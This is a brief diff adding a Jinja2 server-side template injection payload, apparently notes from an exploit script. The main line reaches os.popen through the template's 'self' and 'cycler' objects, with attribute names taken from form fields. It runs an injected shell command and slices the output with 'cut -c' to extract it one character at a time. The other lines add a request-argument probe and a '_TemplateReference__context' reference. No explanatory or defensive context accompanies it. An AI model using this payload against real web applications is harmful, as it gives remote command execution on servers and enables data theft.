@@ -1,0 +1,5 @@
+{{ self[request['form']['t']]['cycler'][request['form']['i']][request['form']['g']]['os']['popen']('"+cmd+"| cut -c"+str(i)+"')['read']()
+
+{{ request.args['t']}}
+
+t = _TemplateReference__context
